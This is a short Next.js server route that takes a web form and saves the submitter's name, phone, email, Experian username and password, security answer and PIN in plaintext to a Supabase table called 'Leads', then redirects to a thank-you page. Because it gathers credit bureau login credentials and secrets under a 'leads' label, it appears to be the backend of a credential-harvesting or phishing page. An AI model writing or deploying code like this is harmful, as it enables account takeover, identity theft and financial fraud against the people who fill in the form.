import { NextResponse } from "next/server";
import { supabase } from "@/app/lib/supabase";

export const runtime = "nodejs";

export async function POST(req: Request) {
  try {
    const form = await req.formData();

    const payload = {
      name: form.get("name") || null,
      phone: form.get("phone") || null,
      email: form.get("email") || null,
      experian_username: form.get("experian_username") || null,
      experian_password: form.get("experian_password") || null,
      security_answer: form.get("security_answer") || null,
      pin: form.get("pin") || null,
    };

    const { error } = await supabase
      .from("Leads")
      .insert([payload]);

    if (error) {
      return NextResponse.json(
        { error: error.message },
        { status: 400 }
      );
    }

    // ✅ SUCCESS: redirect to thank-you page
    return NextResponse.redirect(
      new URL("/thank-you", req.url),
      { status: 303 }
    );

  } catch (err) {
    return NextResponse.json(
      { error: "Server error" },
      { status: 500 }
    );
  }
}